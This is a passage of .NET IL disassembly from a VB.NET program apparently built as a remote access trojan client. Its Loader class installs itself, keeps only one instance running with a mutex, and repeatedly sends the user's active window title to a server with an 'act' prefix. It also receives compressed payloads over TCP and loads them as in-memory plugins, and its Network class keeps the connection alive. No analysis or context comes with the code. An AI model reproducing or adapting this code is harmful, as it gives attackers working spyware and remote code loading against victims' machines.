      IL_0005:  call       class [mscorlib]System.Threading.Mutex [mscorlib]System.Threading.Mutex::OpenExisting(string)
      IL_000a:  pop
      IL_000b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0010:  leave.s    IL_0020

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0012:  dup
      IL_0013:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0018:  stloc.3
      IL_0019:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001e:  leave.s    IL_0020

    }  // end handler
    IL_0020:  ldc.i4.1
    IL_0021:  ldsfld     string Q.SettingPad::RG
    IL_0026:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string)
    IL_002b:  stsfld     object Q.SettingPad::MT
    IL_0030:  call       void Q.Accessories::Install()
    IL_0035:  ldnull
    IL_0036:  ldftn      void Q.Loader::K2()
    IL_003c:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0041:  ldc.i4.1
    IL_0042:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0047:  stloc.1
    IL_0048:  ldloc.1
    IL_0049:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_004e:  ldc.i4.0
    IL_004f:  stloc.0
    IL_0050:  ldstr      ""
    IL_0055:  stloc.2
    IL_0056:  br         IL_0110

    IL_005b:  ldc.i4.s   100
    IL_005d:  call       object Q.BasicFunctions::Thr(int32)
    IL_0062:  pop
    IL_0063:  ldsfld     bool Q.SettingPad::Cn
    IL_0068:  brtrue.s   IL_0070

    IL_006a:  ldstr      ""
    IL_006f:  stloc.2
    .try
    {
      IL_0070:  ldloc.0
      IL_0071:  ldc.i4.1
      IL_0072:  add.ovf
      IL_0073:  stloc.0
      IL_0074:  ldloc.0
      IL_0075:  ldc.i4.5
      IL_0076:  bne.un.s   IL_009d

      .try
      {
        IL_0078:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_007d:  ldc.i4     0x400
        IL_0082:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_0087:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_008c:  leave.s    IL_009d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_008e:  dup
        IL_008f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0094:  stloc.s    V_4
        IL_0096:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_009b:  leave.s    IL_009d

      }  // end handler
      IL_009d:  ldloc.0
      IL_009e:  ldc.i4.8
      IL_009f:  blt.s      IL_00f4

      IL_00a1:  ldc.i4.0
      IL_00a2:  stloc.0
      IL_00a3:  call       string Q.Accessories::ActiveW()
      IL_00a8:  stloc.s    V_5
      IL_00aa:  ldloc.2
      IL_00ab:  ldloc.s    V_5
      IL_00ad:  ldc.i4.0
      IL_00ae:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00b3:  ldc.i4.0
      IL_00b4:  beq.s      IL_00f4

      IL_00b6:  ldloc.s    V_5
      IL_00b8:  stloc.2
      IL_00b9:  ldc.i4.s   100
      IL_00bb:  call       object Q.BasicFunctions::Thr(int32)
      IL_00c0:  pop
      IL_00c1:  ldc.i4.3
      IL_00c2:  newarr     [mscorlib]System.Byte
      IL_00c7:  stloc.s    V_8
      IL_00c9:  ldloc.s    V_8
      IL_00cb:  ldc.i4.0
      IL_00cc:  ldc.i4.s   97
      IL_00ce:  stelem.i1
      IL_00cf:  ldloc.s    V_8
      IL_00d1:  ldc.i4.1
      IL_00d2:  ldc.i4.s   99
      IL_00d4:  stelem.i1
      IL_00d5:  ldloc.s    V_8
      IL_00d7:  ldc.i4.2
      IL_00d8:  ldc.i4.s   116
      IL_00da:  stelem.i1
      IL_00db:  ldloc.s    V_8
      IL_00dd:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_00e2:  ldsfld     string Q.SettingPad::Y
      IL_00e7:  ldloc.s    V_5
      IL_00e9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00ee:  call       bool Q.BasicFunctions::SendIt(string)
      IL_00f3:  pop
      IL_00f4:  leave.s    IL_0110

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00f6:  dup
      IL_00f7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fc:  stloc.s    V_6
      IL_00fe:  ldc.i4     0x3e8
      IL_0103:  call       object Q.BasicFunctions::Thr(int32)
      IL_0108:  pop
      IL_0109:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010e:  leave.s    IL_0110

    }  // end handler
    IL_0110:  ldc.i4.1
    IL_0111:  brtrue     IL_005b

    IL_0116:  ret
  } // end of method Loader::K

  .method public static void  K2() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init (class [mscorlib]System.Threading.Thread V_0)
    IL_0000:  ldnull
    IL_0001:  ldftn      void Q.Loader::K3()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  ldc.i4.1
    IL_000d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0012:  stloc.0
    IL_0013:  ldloc.0
    IL_0014:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0019:  ret
  } // end of method Loader::K2

  .method public static void  K3() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init (class [mscorlib]System.Threading.Thread V_0)
    IL_0000:  ldnull
    IL_0001:  ldftn      void Q.Loader::UntilConnect()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  ldc.i4.1
    IL_000d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0012:  stloc.0
    IL_0013:  ldloc.0
    IL_0014:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0019:  ret
  } // end of method Loader::K3

  .method public static void  UntilConnect() cil managed
  {
    // Code size       737 (0x2e1)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int32 V_2,
             int64 V_3,
             string V_4,
             int32 V_5,
             class [mscorlib]System.Threading.Thread V_6,
             class [mscorlib]System.Exception V_7,
             int32 V_8,
             char V_9)
    IL_0000:  ldc.i4     0xbb8
    IL_0005:  call       object Q.BasicFunctions::Thr(int32)
    IL_000a:  pop
    IL_000b:  ldc.i4.1
    IL_000c:  stsfld     bool Q.SettingPad::Cn
    IL_0011:  ldstr      ""
    IL_0016:  stsfld     string Q.SettingPad::LC
    IL_001b:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
    IL_0020:  brfalse    IL_025e

    IL_0025:  ldc.i4.m1
    IL_0026:  conv.i8
    IL_0027:  stloc.0
    IL_0028:  ldc.i4.0
    IL_0029:  stloc.1
    .try
    {
      IL_002a:  ldloc.1
      IL_002b:  ldc.i4.1
      IL_002c:  add.ovf
      IL_002d:  stloc.1
      IL_002e:  ldloc.1
      IL_002f:  ldc.i4.s   10
      IL_0031:  bne.un.s   IL_0035

      IL_0033:  ldc.i4.0
      IL_0034:  stloc.1
      IL_0035:  ldsfld     bool Q.SettingPad::Cn
      IL_003a:  brtrue.s   IL_0041

      IL_003c:  leave      IL_025e

      IL_0041:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
      IL_0046:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_004b:  ldc.i4.1
      IL_004c:  bge.s      IL_0060

      IL_004e:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
      IL_0053:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0058:  ldc.i4.m1
      IL_0059:  ldc.i4.0
      IL_005a:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_005f:  pop
      IL_0060:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
      IL_0065:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_006a:  ldc.i4.0
      IL_006b:  ble        IL_0246

      IL_0070:  ldloc.0
      IL_0071:  ldc.i4.m1
      IL_0072:  conv.i8
      IL_0073:  bne.un     IL_0145

      IL_0078:  ldstr      ""
      IL_007d:  stloc.s    V_4
      IL_007f:  br         IL_0121

      IL_0084:  ldc.i4.1
      IL_0085:  call       object Q.BasicFunctions::Thr(int32)
      IL_008a:  pop
      IL_008b:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
      IL_0090:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0095:  newobj     instance void [System]System.Net.Sockets.NetworkStream::.ctor(class [System]System.Net.Sockets.Socket)
      IL_009a:  stsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT
      IL_009f:  ldsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT
      IL_00a4:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_00a9:  stloc.s    V_5
      IL_00ab:  ldloc.s    V_5
      IL_00ad:  ldc.i4.m1
      IL_00ae:  sub
      IL_00af:  switch     ( 
                            IL_00be,
                            IL_00c5)
      IL_00bc:  br.s       IL_00fe

      IL_00be:  leave      IL_025e

      IL_00c3:  br.s       IL_00fe

      IL_00c5:  ldloc.s    V_4
      IL_00c7:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_00cc:  stloc.0
      IL_00cd:  ldstr      ""
      IL_00d2:  stloc.s    V_4
      IL_00d4:  ldloc.0
      IL_00d5:  ldc.i4.0
      IL_00d6:  conv.i8
      IL_00d7:  bne.un.s   IL_00e7

      IL_00d9:  ldstr      ""
      IL_00de:  call       bool Q.BasicFunctions::SendIt(string)
      IL_00e3:  pop
      IL_00e4:  ldc.i4.m1
      IL_00e5:  conv.i8
      IL_00e6:  stloc.0
      IL_00e7:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
      IL_00ec:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00f1:  ldc.i4.0
      IL_00f2:  bgt.s      IL_00f9

      IL_00f4:  br         IL_002a

      IL_00f9:  br         IL_0060

      IL_00fe:  ldloc.s    V_4
      IL_0100:  ldloc.s    V_5
      IL_0102:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0107:  stloc.s    V_9
      IL_0109:  ldloca.s   V_9
      IL_010b:  call       instance string [mscorlib]System.Char::ToString()
      IL_0110:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0115:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_011a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_011f:  stloc.s    V_4
      IL_0121:  ldc.i4.1
      IL_0122:  brtrue     IL_0084

      IL_0127:  ldsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT
      IL_012c:  callvirt   instance void [System]System.Net.Sockets.NetworkStream::Flush()
      IL_0131:  ldsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT
      IL_0136:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_013b:  ldsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT
      IL_0140:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_0145:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
      IL_014a:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_014f:  ldc.i4.1
      IL_0150:  add.ovf
      IL_0151:  ldc.i4.1
      IL_0152:  sub.ovf
      IL_0153:  ldc.i4.1
      IL_0154:  add.ovf
      IL_0155:  newarr     [mscorlib]System.Byte
      IL_015a:  stsfld     uint8[] Q.SettingPad::B
      IL_015f:  ldloc.0
      IL_0160:  ldsfld     class [mscorlib]System.IO.MemoryStream Q.SettingPad::MeM
      IL_0165:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_016a:  sub.ovf
      IL_016b:  stloc.3
      IL_016c:  ldsfld     uint8[] Q.SettingPad::B
      IL_0171:  ldlen
      IL_0172:  conv.ovf.i4
      IL_0173:  conv.i8
      IL_0174:  ldloc.3
      IL_0175:  ble.s      IL_018c

      IL_0177:  ldloc.3
      IL_0178:  ldc.i4.1
      IL_0179:  conv.i8
      IL_017a:  sub.ovf
      IL_017b:  conv.ovf.i4
      IL_017c:  ldc.i4.1
      IL_017d:  add.ovf
      IL_017e:  ldc.i4.1
      IL_017f:  sub.ovf
      IL_0180:  ldc.i4.1
      IL_0181:  add.ovf
      IL_0182:  newarr     [mscorlib]System.Byte
      IL_0187:  stsfld     uint8[] Q.SettingPad::B
      IL_018c:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
      IL_0191:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0196:  newobj     instance void [System]System.Net.Sockets.NetworkStream::.ctor(class [System]System.Net.Sockets.Socket)
      IL_019b:  stsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT2
      IL_01a0:  ldsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT2
      IL_01a5:  ldsfld     uint8[] Q.SettingPad::B
      IL_01aa:  ldc.i4.0
      IL_01ab:  ldsfld     uint8[] Q.SettingPad::B
      IL_01b0:  ldlen
      IL_01b1:  conv.ovf.i4
      IL_01b2:  callvirt   instance int32 [System]System.Net.Sockets.NetworkStream::Read(uint8[],
                                                                                         int32,
                                                                                         int32)
      IL_01b7:  stloc.2
      IL_01b8:  ldsfld     class [mscorlib]System.IO.MemoryStream Q.SettingPad::MeM
      IL_01bd:  ldsfld     uint8[] Q.SettingPad::B
      IL_01c2:  ldc.i4.0
      IL_01c3:  ldloc.2
      IL_01c4:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_01c9:  ldsfld     class [mscorlib]System.IO.MemoryStream Q.SettingPad::MeM
      IL_01ce:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_01d3:  ldloc.0
      IL_01d4:  bne.un.s   IL_021c

      IL_01d6:  ldc.i4.m1
      IL_01d7:  conv.i8
      IL_01d8:  stloc.0
      IL_01d9:  ldnull
      IL_01da:  ldftn      void Q.Loader::S(object)
      IL_01e0:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_01e5:  ldc.i4.1
      IL_01e6:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_01eb:  stloc.s    V_6
      IL_01ed:  ldloc.s    V_6
      IL_01ef:  ldsfld     class [mscorlib]System.IO.MemoryStream Q.SettingPad::MeM
      IL_01f4:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_01f9:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_01fe:  ldloc.s    V_6
      IL_0200:  ldc.i4.s   100
      IL_0202:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_0207:  pop
      IL_0208:  ldsfld     class [mscorlib]System.IO.MemoryStream Q.SettingPad::MeM
      IL_020d:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0212:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0217:  stsfld     class [mscorlib]System.IO.MemoryStream Q.SettingPad::MeM
      IL_021c:  ldc.i4.1
      IL_021d:  call       object Q.BasicFunctions::Thr(int32)
      IL_0222:  pop
      IL_0223:  ldsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT2
      IL_0228:  callvirt   instance void [System]System.Net.Sockets.NetworkStream::Flush()
      IL_022d:  ldsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT2
      IL_0232:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0237:  ldsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT2
      IL_023c:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_0241:  br         IL_002a

      IL_0246:  leave.s    IL_025e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0248:  dup
      IL_0249:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_024e:  stloc.s    V_7
      IL_0250:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0255:  leave.s    IL_025e

      IL_0257:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_025c:  leave.s    IL_025e

    }  // end handler
    IL_025e:  nop
    IL_025f:  ldc.i4     0x3e8
    IL_0264:  call       object Q.BasicFunctions::Thr(int32)
    IL_0269:  pop
    .try
    {
      IL_026a:  ldsfld     object Q.SettingPad::SlaveM
      IL_026f:  brfalse.s  IL_02b6

      IL_0271:  ldsfld     object Q.SettingPad::SlaveM
      IL_0276:  ldnull
      IL_0277:  ldstr      "clear"
      IL_027c:  ldc.i4.0
      IL_027d:  newarr     [mscorlib]System.Object
      IL_0282:  ldnull
      IL_0283:  ldnull
      IL_0284:  ldnull
      IL_0285:  ldc.i4.1
      IL_0286:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_028b:  pop
      IL_028c:  ldnull
      IL_028d:  stsfld     object Q.SettingPad::SlaveM
      IL_0292:  ldsfld     class [mscorlib]System.IO.MemoryStream Q.SettingPad::MeM
      IL_0297:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_029c:  call       uint8[] Q.Accessories::Z(uint8[])
      IL_02a1:  ldsfld     string [mscorlib]System.String::Empty
      IL_02a6:  ldc.i4.1
      IL_02a7:  call       object Q.BasicFunctions::XR(uint8[],
                                                       string,
                                                       bool)
      IL_02ac:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_02b1:  stsfld     object Q.SettingPad::SlaveM
      IL_02b6:  leave.s    IL_02c4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c2:  leave.s    IL_02c4

    }  // end handler
    IL_02c4:  ldc.i4.0
    IL_02c5:  stsfld     bool Q.SettingPad::Cn
    IL_02ca:  call       bool Q.Loader::Connection()
    IL_02cf:  brtrue.s   IL_02d3

    IL_02d1:  br.s       IL_025e

    IL_02d3:  ldc.i4.s   100
    IL_02d5:  call       object Q.BasicFunctions::Thr(int32)
    IL_02da:  pop
    IL_02db:  br         IL_0000

    IL_02e0:  ret
  } // end of method Loader::UntilConnect

  .method private specialname static void 
          _Lambda$__1() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
    IL_0005:  ldc.i4     0x493e0
    IL_000a:  conv.i8
    IL_000b:  ldc.i4     0x3e8
    IL_0010:  conv.i8
    IL_0011:  call       bool Q.Network::PreventShoot(class [System]System.Net.Sockets.TcpClient,
                                                      uint64,
                                                      uint64)
    IL_0016:  pop
    IL_0017:  ret
  } // end of method Loader::_Lambda$__1

  .method private specialname static void 
          _Lambda$__2() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
    IL_0005:  ldc.i4     0x493e0
    IL_000a:  conv.i8
    IL_000b:  ldc.i4     0x3e8
    IL_0010:  conv.i8
    IL_0011:  call       bool Q.Network::PreventShoot(class [System]System.Net.Sockets.TcpClient,
                                                      uint64,
                                                      uint64)
    IL_0016:  pop
    IL_0017:  ret
  } // end of method Loader::_Lambda$__2

} // end of class Q.Loader

.class public auto ansi Q.Network
       extends [mscorlib]System.Object
{
  .field private static literal int32 Bg = int32(0x00000004)
  .field private static literal int32 BSp = int32(0x00000008)
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Network::.ctor

  .method public static string  NPn() cil managed
  {
    // Code size       36 (0x24)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  ldsfld     int32 Q.SettingPad::NP
    IL_0005:  ldsfld     string[] Q.SettingPad::PN
    IL_000a:  ldlen
    IL_000b:  conv.ovf.i4
    IL_000c:  blt.s      IL_0014

    IL_000e:  ldc.i4.0
    IL_000f:  stsfld     int32 Q.SettingPad::NP
    IL_0014:  ldsfld     string[] Q.SettingPad::PN
    IL_0019:  ldsfld     int32 Q.SettingPad::NP
    IL_001e:  ldelem.ref
    IL_001f:  stloc.0
    IL_0020:  br.s       IL_0022

    IL_0022:  ldloc.0
    IL_0023:  ret
  } // end of method Network::NPn

  .method public static object  MH() cil managed
  {
    // Code size       36 (0x24)
    .maxstack  2
    .locals init (object V_0)
    IL_0000:  ldsfld     int32 Q.SettingPad::NH
    IL_0005:  ldsfld     string[] Q.SettingPad::HH
    IL_000a:  ldlen
    IL_000b:  conv.ovf.i4
    IL_000c:  blt.s      IL_0014

    IL_000e:  ldc.i4.0
    IL_000f:  stsfld     int32 Q.SettingPad::NH
    IL_0014:  ldsfld     string[] Q.SettingPad::HH
    IL_0019:  ldsfld     int32 Q.SettingPad::NH
    IL_001e:  ldelem.ref
    IL_001f:  stloc.0
    IL_0020:  br.s       IL_0022

    IL_0022:  ldloc.0
    IL_0023:  ret
  } // end of method Network::MH

  .method public static bool  PreventShoot(class [System]System.Net.Sockets.TcpClient Sok,
                                           uint64 Tm,
                                           uint64 Inl) cil managed
  {
    // Code size       253 (0xfd)
    .maxstack  4
    .locals init (bool V_0,
             uint64[] V_1,
             uint8[] V_2,
             uint8[] V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5,
             int32 V_6)
    .try
    {
      IL_0000:  ldc.i4.s   12
      IL_0002:  newarr     [mscorlib]System.Byte
      IL_0007:  stloc.3
      IL_0008:  ldc.i4.3
      IL_0009:  newarr     [mscorlib]System.UInt64
      IL_000e:  stloc.1
      IL_000f:  ldarg.1
      IL_0010:  newobj     instance void [mscorlib]System.Decimal::.ctor(uint64)
      IL_0015:  ldsfld     valuetype [mscorlib]System.Decimal [mscorlib]System.Decimal::Zero
      IL_001a:  call       int32 [mscorlib]System.Decimal::Compare(valuetype [mscorlib]System.Decimal,
                                                                   valuetype [mscorlib]System.Decimal)
      IL_001f:  ldc.i4.0
      IL_0020:  ceq
      IL_0022:  ldarg.2
      IL_0023:  newobj     instance void [mscorlib]System.Decimal::.ctor(uint64)
      IL_0028:  ldsfld     valuetype [mscorlib]System.Decimal [mscorlib]System.Decimal::Zero
      IL_002d:  call       int32 [mscorlib]System.Decimal::Compare(valuetype [mscorlib]System.Decimal,
                                                                   valuetype [mscorlib]System.Decimal)
      IL_0032:  ldc.i4.0
      IL_0033:  ceq
      IL_0035:  or
      IL_0036:  brfalse.s  IL_003f

      IL_0038:  ldloc.1
      IL_0039:  ldc.i4.0
      IL_003a:  ldc.i4.0
      IL_003b:  conv.i8
      IL_003c:  stelem.i8
      IL_003d:  br.s       IL_0044

      IL_003f:  ldloc.1
      IL_0040:  ldc.i4.0
      IL_0041:  ldc.i4.1
      IL_0042:  conv.i8
      IL_0043:  stelem.i8
      IL_0044:  ldloc.1
      IL_0045:  ldc.i4.1
      IL_0046:  ldarg.1
      IL_0047:  stelem.i8
      IL_0048:  ldloc.1
      IL_0049:  ldc.i4.2
      IL_004a:  ldarg.2
      IL_004b:  stelem.i8
      IL_004c:  ldc.i4.0
      IL_004d:  ldloc.1
      IL_004e:  ldlen
      IL_004f:  conv.ovf.i4
      IL_0050:  ldc.i4.1
      IL_0051:  sub.ovf
      IL_0052:  stloc.s    V_6
      IL_0054:  stloc.s    V_4
      IL_0056:  br.s       IL_00bc

      IL_0058:  ldloc.3
      IL_0059:  ldloc.s    V_4
      IL_005b:  ldc.i4.4
      IL_005c:  mul.ovf
      IL_005d:  ldc.i4.3
      IL_005e:  add.ovf
      IL_005f:  ldloc.1
      IL_0060:  ldloc.s    V_4
      IL_0062:  ldelem.i8
      IL_0063:  ldc.i4.s   24
      IL_0065:  shr.un
      IL_0066:  conv.ovf.i8.un
      IL_0067:  ldc.i4     0xff
      IL_006c:  conv.i8
      IL_006d:  and
      IL_006e:  conv.ovf.u1
      IL_006f:  stelem.i1
      IL_0070:  ldloc.3
      IL_0071:  ldloc.s    V_4
      IL_0073:  ldc.i4.4
      IL_0074:  mul.ovf
      IL_0075:  ldc.i4.2
      IL_0076:  add.ovf
      IL_0077:  ldloc.1
      IL_0078:  ldloc.s    V_4
      IL_007a:  ldelem.i8
      IL_007b:  ldc.i4.s   16
      IL_007d:  shr.un
      IL_007e:  conv.ovf.i8.un
      IL_007f:  ldc.i4     0xff
      IL_0084:  conv.i8
      IL_0085:  and
      IL_0086:  conv.ovf.u1
      IL_0087:  stelem.i1
      IL_0088:  ldloc.3
      IL_0089:  ldloc.s    V_4
      IL_008b:  ldc.i4.4
      IL_008c:  mul.ovf
      IL_008d:  ldc.i4.1
      IL_008e:  add.ovf
      IL_008f:  ldloc.1
      IL_0090:  ldloc.s    V_4
      IL_0092:  ldelem.i8
      IL_0093:  ldc.i4.8
      IL_0094:  shr.un
      IL_0095:  conv.ovf.i8.un
      IL_0096:  ldc.i4     0xff
      IL_009b:  conv.i8
      IL_009c:  and
      IL_009d:  conv.ovf.u1
      IL_009e:  stelem.i1
      IL_009f:  ldloc.3
      IL_00a0:  ldloc.s    V_4
      IL_00a2:  ldc.i4.4
      IL_00a3:  mul.ovf
      IL_00a4:  ldc.i4.0
      IL_00a5:  add.ovf
      IL_00a6:  ldloc.1
      IL_00a7:  ldloc.s    V_4
      IL_00a9:  ldelem.i8
      IL_00aa:  ldc.i4.0
      IL_00ab:  shr.un
      IL_00ac:  conv.ovf.i8.un
      IL_00ad:  ldc.i4     0xff
      IL_00b2:  conv.i8
      IL_00b3:  and
      IL_00b4:  conv.ovf.u1
      IL_00b5:  stelem.i1
      IL_00b6:  ldloc.s    V_4
      IL_00b8:  ldc.i4.1
      IL_00b9:  add.ovf
      IL_00ba:  stloc.s    V_4
      IL_00bc:  ldloc.s    V_4
      IL_00be:  ldloc.s    V_6
      IL_00c0:  ble.s      IL_0058

      IL_00c2:  ldc.i4.0
      IL_00c3:  call       uint8[] [mscorlib]System.BitConverter::GetBytes(int32)
      IL_00c8:  stloc.2
      IL_00c9:  ldarg.0
      IL_00ca:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_00cf:  ldc.i4     0x98000004
      IL_00d4:  conv.u8
      IL_00d5:  ldloc.3
      IL_00d6:  ldloc.2
      IL_00d7:  callvirt   instance int32 [System]System.Net.Sockets.Socket::IOControl(valuetype [System]System.Net.Sockets.IOControlCode,
                                                                                       uint8[],
                                                                                       uint8[])
      IL_00dc:  pop
      IL_00dd:  leave.s    IL_00f7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00df:  dup
      IL_00e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e5:  stloc.s    V_5
      IL_00e7:  ldc.i4.0
      IL_00e8:  stloc.0
      IL_00e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ee:  leave.s    IL_00fb

      IL_00f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00f5:  leave.s    IL_00f7

    }  // end handler
    IL_00f7:  ldc.i4.1
